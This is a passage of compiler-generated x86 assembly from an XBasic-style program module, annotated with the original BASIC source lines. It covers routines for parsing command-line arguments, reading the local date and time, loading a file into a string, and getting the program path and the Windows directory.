; [3110] upper = UBOUND (setargv$[])
#ifdef GetCommandLineArguments.upper
#undef GetCommandLineArguments.upper
#endif
#define GetCommandLineArguments.upper ebp-44	; exposes local variable 'upper'
;
	mov	eax,d[%%%setargv$.server]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.445			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.445:
	dec	eax			;;; i596
	mov	d[ebp-44],eax			;;; i670
;
; [3111] ucount = upper + 1
#ifdef GetCommandLineArguments.ucount
#undef GetCommandLineArguments.ucount
#endif
#define GetCommandLineArguments.ucount ebp-48	; exposes local variable 'ucount'
;
	mov	eax,d[ebp-44]			;;; i665
	add	eax,1			;;; i775
	mov	d[ebp-48],eax			;;; i670
;
; [3112] IF (argc > ucount) THEN argc = ucount
	mov	eax,d[ebp+8]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jle	>> else.012F.server			;;; i219
	mov	eax,d[ebp-48]			;;; i665
	mov	d[ebp+8],eax			;;; i670
else.012F.server:
end.if.012F.server:
;
; [3113] IF argc THEN
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0130.server			;;; i221
;
; [3114] DIM argv$[upper]
	sub	esp,64			;;; i430
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[ebp+12]			;;; i665
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1072496636			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[ebp+12],eax			;;; i670
;
; [3115] FOR i = 0 TO upper
#ifdef GetCommandLineArguments.i
#undef GetCommandLineArguments.i
#endif
#define GetCommandLineArguments.i ebp-52	; exposes local variable 'i'
;
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i665
; .forlimit5F.0131 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
align 8
for.0131.server:
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.0131.server			;;; i154
;
; [3116] argv$[i] = setargv$[i]
	mov	eax,d[ebp-52]			;;; i665
	mov	edx,d[%%%setargv$.server]			;;; i663a
	mov	eax,[edx+eax*4]			;;; i464
	call	%_clone.a0			;;; i21
	mov	ebx,d[ebp-52]			;;; i665
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx*4]			;;; i464
	mov	esi,d[ebx]			;;; i26
	mov	d[ebx],eax			;;; i27
	call	%____free			;;; i28
;
; [3117] NEXT i
do.next.0131.server:
	inc	d[ebp-52]			;;; i229
	jmp	for.0131.server			;;; i231
end.for.0131.server:
;
; [3118] END IF
else.0130.server:
end.if.0130.server:
;
; [3119] RETURN ($$FALSE)
	mov	eax,0			;;; i659
	jmp	end.func5F.server			;;; i258
;
; [3120] END IF
else.012E.server:
end.if.012E.server:
;
; [3121] END IF
else.012D.server:
end.if.012D.server:
;
; [3122] '
;
; [3123] ' get original command line arguments from system
;
; [3124] '
;
; [3125] argc = 0
	mov	eax,0			;;; i659
	mov	d[ebp+8],eax			;;; i670
;
; [3126] index = 0
#ifdef GetCommandLineArguments.index
#undef GetCommandLineArguments.index
#endif
#define GetCommandLineArguments.index ebp-60	; exposes local variable 'index'
;
	mov	eax,0			;;; i659
	mov	d[ebp-60],eax			;;; i670
;
; [3127] DIM argv$[]
	sub	esp,64			;;; i430
	mov	esi,d[ebp+12]			;;; i665
	call	%_FreeArray			;;; i431
	mov	esi,0			;;; i666
	mov	d[ebp+12],esi			;;; i670
	add	esp,64
;
; [3128] addr = GetCommandLineA()' address of full command line
#ifdef GetCommandLineArguments.addr
#undef GetCommandLineArguments.addr
#endif
#define GetCommandLineArguments.addr ebp-64	; exposes local variable 'addr'
;
	call	_GetCommandLineA@0			;;; i619
	mov	d[ebp-64],eax			;;; i670
;
; [3129] line$ = CSTRING$(addr)
#ifdef GetCommandLineArguments.line$
#undef GetCommandLineArguments.line$
#endif
#define GetCommandLineArguments.line$ ebp-68	; exposes local variable 'line$'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-64]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-68]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3131] done = 0
#ifdef GetCommandLineArguments.done
#undef GetCommandLineArguments.done
#endif
#define GetCommandLineArguments.done ebp-72	; exposes local variable 'done'
;
	mov	eax,0			;;; i659
	mov	d[ebp-72],eax			;;; i670
;
; [3132] IF addr THEN
	mov	eax,d[ebp-64]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0132.server			;;; i221
;
; [3133] DIM argv$[1023]
	sub	esp,64			;;; i430
	mov	eax,1023			;;; i659
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[ebp+12]			;;; i665
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1072496636			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[ebp+12],eax			;;; i670
;
; [3134] quote = $$FALSE
#ifdef GetCommandLineArguments.quote
#undef GetCommandLineArguments.quote
#endif
#define GetCommandLineArguments.quote ebp-76	; exposes local variable 'quote'
;
	mov	eax,0			;;; i659
	mov	d[ebp-76],eax			;;; i670
;
; [3135] argc = 0
	mov	eax,0			;;; i659
	mov	d[ebp+8],eax			;;; i670
;
; [3136] empty = $$FALSE
#ifdef GetCommandLineArguments.empty
#undef GetCommandLineArguments.empty
#endif
#define GetCommandLineArguments.empty ebp-80	; exposes local variable 'empty'
;
	mov	eax,0			;;; i659
	mov	d[ebp-80],eax			;;; i670
;
; [3137] I = 0
#ifdef GetCommandLineArguments.I
#undef GetCommandLineArguments.I
#endif
#define GetCommandLineArguments.I ebp-84	; exposes local variable 'I'
;
	mov	eax,0			;;; i659
	mov	d[ebp-84],eax			;;; i670
;
; [3138] DO
align 8
do.0133.server:
;
; [3139] cha = UBYTEAT(addr, I)
#ifdef GetCommandLineArguments.cha
#undef GetCommandLineArguments.cha
#endif
#define GetCommandLineArguments.cha ebp-88	; exposes local variable 'cha'
;
	mov	edi,d[ebp-84]			;;; i665
	mov	esi,d[ebp-64]			;;; i665
	movzx	eax,b[esi+edi]			;;; i491
	mov	d[ebp-88],eax			;;; i670
;
; [3140] IF (cha < ' ') THEN EXIT DO
	mov	eax,d[ebp-88]			;;; i665
	cmp	eax,32			;;; i684a
	jge	>> else.0134.server			;;; i219
	jmp	end.do.0133.server			;;; i144
else.0134.server:
end.if.0134.server:
;
; [3142] IF (cha = ' ') AND NOT quote THEN
	mov	eax,d[ebp-88]			;;; i665
	cmp	eax,32			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.447			;;; i467
	not	eax			;;; i468
A.447:
;+peep
	mov	ebx,d[ebp-76]			;;; i665
	not	ebx			;;; i923
	and	eax,ebx			;;; i769
	test	eax,eax			;;; i220
	jz	>> else.0135.server			;;; i221
;
; [3143] IF NOT empty THEN
	mov	eax,d[ebp-80]			;;; i665
	not	eax			;;; i923
	test	eax,eax			;;; i220
	jz	>> else.0136.server			;;; i221
;
; [3144] INC argc
	inc	d[ebp+8]			;;; i84
;
; [3145] argv$[argc] = ""
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i21
	mov	ebx,d[ebp+8]			;;; i665
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx*4]			;;; i464
	mov	esi,d[ebx]			;;; i26
	mov	d[ebx],eax			;;; i27
	call	%____free			;;; i28
;
; [3146] empty = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[ebp-80],eax			;;; i670
;
; [3147] END IF
else.0136.server:
end.if.0136.server:
;
; [3148] ELSE
	jmp	end.if.0135.server			;;; i107
else.0135.server:
;
; [3149] IF (cha = '"') THEN
	mov	eax,d[ebp-88]			;;; i665
	cmp	eax,34			;;; i684a
	jne	>> else.0137.server			;;; i219
;
; [3150] quote = NOT quote
	mov	eax,d[ebp-76]			;;; i665
	not	eax			;;; i923
	mov	d[ebp-76],eax			;;; i670
;
; [3151] ELSE
	jmp	end.if.0137.server			;;; i107
else.0137.server:
;
; [3152] argv$[argc] = argv$[argc] + CHR$(cha)
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[ebp+12]			;;; i665
	mov	eax,[edx+eax*4]			;;; i464
; .xstk5F.0000 = ebp-96	; internal variable
	mov	[ebp-96],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-88]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_chr.d			;;; i575
	add	esp,64			;;; i600
	mov	ebx,[ebp-96]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,d[ebp+8]			;;; i665
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx*4]			;;; i464
	mov	esi,d[ebx]			;;; i26
	mov	d[ebx],eax			;;; i27
	call	%____free			;;; i28
;
; [3153] empty = $$FALSE
	mov	eax,0			;;; i659
	mov	d[ebp-80],eax			;;; i670
;
; [3154] END IF
end.if.0137.server:
;
; [3155] END IF
end.if.0135.server:
;
; [3156] INC I
	inc	d[ebp-84]			;;; i84
;
; [3157] LOOP
do.loop.0133.server:
	jmp	do.0133.server			;;; i222
end.do.0133.server:
;
; [3158] IF NOT empty THEN
	mov	eax,d[ebp-80]			;;; i665
	not	eax			;;; i923
	test	eax,eax			;;; i220
	jz	>> else.0138.server			;;; i221
;
; [3159] argc = argc + 1
	mov	eax,d[ebp+8]			;;; i665
	add	eax,1			;;; i775
	mov	d[ebp+8],eax			;;; i670
;
; [3160] END IF
else.0138.server:
end.if.0138.server:
;
; [3161] REDIM argv$[argc-1]
	sub	esp,64			;;; i430
	mov	eax,d[ebp+8]			;;; i665
	sub	eax,1			;;; i791
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[ebp+12]			;;; i665
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1072496636			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_RedimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[ebp+12],eax			;;; i670
;
; [3163] END IF
else.0132.server:
end.if.0132.server:
;
; [3164] '
;
; [3165] ' if input argc < 0 THEN don't overwrite current values
;
; [3166] '
;
; [3167] IF ((setarg = $$FALSE) OR (inc >= 0)) THEN
	mov	eax,d[%setarg.server]			;;; i663a
	cmp	eax,0			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.448			;;; i467
	not	eax			;;; i468
A.448:
;+peep
	mov	ebx,d[ebp-40]			;;; i665
	cmp	ebx,0			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jl	> A.449			;;; i467
	not	ebx			;;; i468
A.449:
;+peep
	or	eax,ebx			;;; i763
	test	eax,eax			;;; i220
	jz	>> else.0139.server			;;; i221
;
; [3168] setarg = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[%setarg.server],eax			;;; i668
;
; [3169] setargc = argc
	mov	eax,d[ebp+8]			;;; i665
	mov	d[%setargc.server],eax			;;; i668
;
; [3170] DIM setargv$[]
	sub	esp,64			;;; i430
	mov	esi,d[%%%setargv$.server]			;;; i663a
	call	%_FreeArray			;;; i431
	mov	esi,0			;;; i666
	mov	d[%%%setargv$.server],esi			;;; i668
	add	esp,64
;
; [3171] IF (argc > 0) THEN
	mov	eax,d[ebp+8]			;;; i665
	cmp	eax,0			;;; i684a
	jle	>> else.013A.server			;;; i219
;
; [3172] DIM setargv$[argc-1]
	sub	esp,64			;;; i430
	mov	eax,d[ebp+8]			;;; i665
	sub	eax,1			;;; i791
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[%%%setargv$.server]			;;; i663a
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1072496636			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[%%%setargv$.server],eax			;;; i668
;
; [3173] FOR i = 0 TO argc-1
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
	mov	eax,d[ebp+8]			;;; i665
	sub	eax,1			;;; i791
; .forlimit5F.013B = ebp-100	; internal variable
	mov	d[ebp-100],eax			;;; i670
align 8
for.013B.server:
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,d[ebp-100]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.013B.server			;;; i154
;
; [3174] setargv$[i] = argv$[i]
	mov	eax,d[ebp-52]			;;; i665
	mov	edx,d[ebp+12]			;;; i665
	mov	eax,[edx+eax*4]			;;; i464
	call	%_clone.a0			;;; i21
	mov	ebx,d[ebp-52]			;;; i665
	mov	ecx,d[%%%setargv$.server]			;;; i663a
	lea	ebx,[ecx+ebx*4]			;;; i464
	mov	esi,d[ebx]			;;; i26
	mov	d[ebx],eax			;;; i27
	call	%____free			;;; i28
;
; [3175] NEXT i
do.next.013B.server:
	inc	d[ebp-52]			;;; i229
	jmp	for.013B.server			;;; i231
end.for.013B.server:
;
; [3176] END IF
else.013A.server:
end.if.013A.server:
;
; [3177] END IF
else.0139.server:
end.if.0139.server:
;
; [3179] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetCommandLineArguments.server:  ;;; Function end label for Assembly Programmers.
end.func5F.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func5F.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func5F.server:
	mov	esi,[ebp-68]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetCommandLineArguments ()  *****
;  *****
;
; [3181] FUNCTION GetLocalDateAndTime (year, month, day, weekDay, hour, minute, second, nanos)
.code
;
#ifdef GetLocalDateAndTime.year
#undef GetLocalDateAndTime.year
#endif
#define GetLocalDateAndTime.year ebp+8	; exposes function argument 'year'
;
;
#ifdef GetLocalDateAndTime.month
#undef GetLocalDateAndTime.month
#endif
#define GetLocalDateAndTime.month ebp+12	; exposes function argument 'month'
;
;
#ifdef GetLocalDateAndTime.day
#undef GetLocalDateAndTime.day
#endif
#define GetLocalDateAndTime.day ebp+16	; exposes function argument 'day'
;
;
#ifdef GetLocalDateAndTime.weekDay
#undef GetLocalDateAndTime.weekDay
#endif
#define GetLocalDateAndTime.weekDay ebp+20	; exposes function argument 'weekDay'
;
;
#ifdef GetLocalDateAndTime.hour
#undef GetLocalDateAndTime.hour
#endif
#define GetLocalDateAndTime.hour ebp+24	; exposes function argument 'hour'
;
;
#ifdef GetLocalDateAndTime.minute
#undef GetLocalDateAndTime.minute
#endif
#define GetLocalDateAndTime.minute ebp+28	; exposes function argument 'minute'
;
;
#ifdef GetLocalDateAndTime.second
#undef GetLocalDateAndTime.second
#endif
#define GetLocalDateAndTime.second ebp+32	; exposes function argument 'second'
;
;
#ifdef GetLocalDateAndTime.nanos
#undef GetLocalDateAndTime.nanos
#endif
#define GetLocalDateAndTime.nanos ebp+36	; exposes function argument 'nanos'
;
align 16
_GetLocalDateAndTime.server@32:
;  *****
;  *****  FUNCTION  GetLocalDateAndTime ()  *****
;  *****
func5E.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody5E.server:
;
; [3182] SYSTEMTIME systemTime
; .composites = ebp-40	; internal variable
#ifdef GetLocalDateAndTime.systemTime
#undef GetLocalDateAndTime.systemTime
#endif
#define GetLocalDateAndTime.systemTime ebp-44	; exposes local variable 'systemTime'
;
;
; [3184] GetLocalTime (&systemTime)
;
; [0] EXTERNAL FUNCTION GetLocalTime (lpSystemTime)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	call	_GetLocalTime@4			;;; i619
;
; [3185] year		= systemTime.year
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax]			;;; i313b
	mov	d[ebp+8],eax			;;; i670
;
; [3186] month		= systemTime.month
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax+2]			;;; i313b
	mov	d[ebp+12],eax			;;; i670
;
; [3187] day			= systemTime.day
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax+6]			;;; i313b
	mov	d[ebp+16],eax			;;; i670
;
; [3188] weekDay	= systemTime.weekDay
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax+4]			;;; i313b
	mov	d[ebp+20],eax			;;; i670
;
; [3189] hour		= systemTime.hour
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax+8]			;;; i313b
	mov	d[ebp+24],eax			;;; i670
;
; [3190] minute	= systemTime.minute
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax+10]			;;; i313b
	mov	d[ebp+28],eax			;;; i670
;
; [3191] second	= systemTime.second
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax+12]			;;; i313b
	mov	d[ebp+32],eax			;;; i670
;
; [3192] 'nanos		= systemTime.msec * 1000000
;
; [3193] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetLocalDateAndTime.server:  ;;; Function end label for Assembly Programmers.
end.func5E.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	32			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetLocalDateAndTime ()  *****
;  *****
;
; [3195] FUNCTION LoadString (f$, text$)
.code
;
#ifdef LoadString.f$
#undef LoadString.f$
#endif
#define LoadString.f$ ebp+8	; exposes function argument 'f$'
;
;
#ifdef LoadString.text$
#undef LoadString.text$
#endif
#define LoadString.text$ ebp+12	; exposes function argument 'text$'
;
align 16
_LoadString.server@8:
;  *****
;  *****  FUNCTION  LoadString ()  *****
;  *****
func5D.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody5D.server:
;
; [3197] ifile = OPEN (f$, $$RD)
#ifdef LoadString.ifile
#undef LoadString.ifile
#endif
#define LoadString.ifile ebp-40	; exposes local variable 'ifile'
;
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],0
	call	%_open.v
	add	esp,64			;;; i600
	mov	d[ebp-40],eax			;;; i670
;
; [3198] IF (ifile < 0) THEN RETURN ($$FALSE)
	mov	eax,d[ebp-40]			;;; i665
	cmp	eax,0			;;; i684a
	jge	>> else.013C.server			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func5D.server			;;; i258
else.013C.server:
end.if.013C.server:
;
; [3199] fileSize = LOF(ifile)
#ifdef LoadString.fileSize
#undef LoadString.fileSize
#endif
#define LoadString.fileSize ebp-44	; exposes local variable 'fileSize'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_lof
	add	esp,64			;;; i600
	mov	d[ebp-44],eax			;;; i670
;
; [3200] IF fileSize THEN
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.013D.server			;;; i221
;
; [3201] text$ = NULL$(fileSize)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3202] READ [ifile], text$
	mov	eax,d[ebp-40]			;;; i665
; .filenumber = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	sub	esp,64			;;; i239
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp],eax			;;; i240
	mov	eax,d[ebp+12]			;;; i665
	mov	d[esp+4],eax			;;; i241
	call	%_ReadString			;;; i242
	add	esp,64			;;; i243
;
; [3203] END IF
else.013D.server:
end.if.013D.server:
;
; [3204] CLOSE (ifile)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_close
	add	esp,64			;;; i600
;
; [3206] RETURN ($$TRUE)
	mov	eax,-1			;;; i659
	jmp	end.func5D.server			;;; i258
;
; [3207] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.LoadString.server:  ;;; Function end label for Assembly Programmers.
end.func5D.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  LoadString ()  *****
;  *****
;
; [3209] FUNCTION STRING GetServerPath()
.code
align 16
_GetServerPath.server@0:
;  *****
;  *****  FUNCTION  GetServerPath ()  *****
;  *****
func14.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func14.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody14.server:
;
; [3210] STRING szPath
#ifdef GetServerPath.szPath
#undef GetServerPath.szPath
#endif
#define GetServerPath.szPath ebp-40	; exposes local variable 'szPath'
;
;
; [3212] szPath = NULL$(513)
	sub	esp,64			;;; i487
	mov	d[esp],513
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3213] GetModuleFileNameA(0, &szPath, 512)
;
; [0] EXTERNAL FUNCTION GetModuleFileNameA (hModule, lpFileName, nSize)
	mov	eax,d[ebp-40]			;;; i642
; .xstk14.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	push	512			;;; i656a
	push	[ebp-48]			;;; i674a
	push	0			;;; i656a
	call	_GetModuleFileNameA@12			;;; i619
;
; [3214] RETURN CSIZE$(szPath)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	jmp	end.func14.server			;;; i258
;
; [3215] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetServerPath.server:  ;;; Function end label for Assembly Programmers.
end.func14.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func14.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func14.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetServerPath ()  *****
;  *****
;
; [3217] FUNCTION STRING GetWindowsDir()
.code
align 16
_GetWindowsDir.server@0:
;  *****
;  *****  FUNCTION  GetWindowsDir ()  *****
;  *****
func1B.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func1B.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody1B.server:
;
; [3218] STRING buffer
#ifdef GetWindowsDir.buffer
#undef GetWindowsDir.buffer
#endif
#define GetWindowsDir.buffer ebp-40	; exposes local variable 'buffer'
;
;
; [3220] buffer = SPACE$(256)
	sub	esp,64			;;; i487
	mov	d[esp],256
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3221] ret = GetWindowsDirectoryA (&buffer, 255)
#ifdef GetWindowsDir.ret
#undef GetWindowsDir.ret
#endif
#define GetWindowsDir.ret ebp-44	; exposes local variable 'ret'
;
;
; [0] EXTERNAL FUNCTION GetWindowsDirectoryA (lpBuffer, nSize)
	mov	eax,d[ebp-40]			;;; i642
; .xstk1B.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	255			;;; i656a
	push	[ebp-52]			;;; i674a
	call	_GetWindowsDirectoryA@8			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [3222] RETURN LEFT$(buffer, ret)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	jmp	end.func1B.server			;;; i258
;
; [3223] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetWindowsDir.server:  ;;; Function end label for Assembly Programmers.
end.func1B.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func1B.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func1B.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetWindowsDir ()  *****
;  *****
;
; [3225] FUNCTION STRING GetSystemDir()
.code
align 16
_GetSystemDir.server@0:
;  *****
;  *****  FUNCTION  GetSystemDir ()  *****
;  *****
func1C.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func1C.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
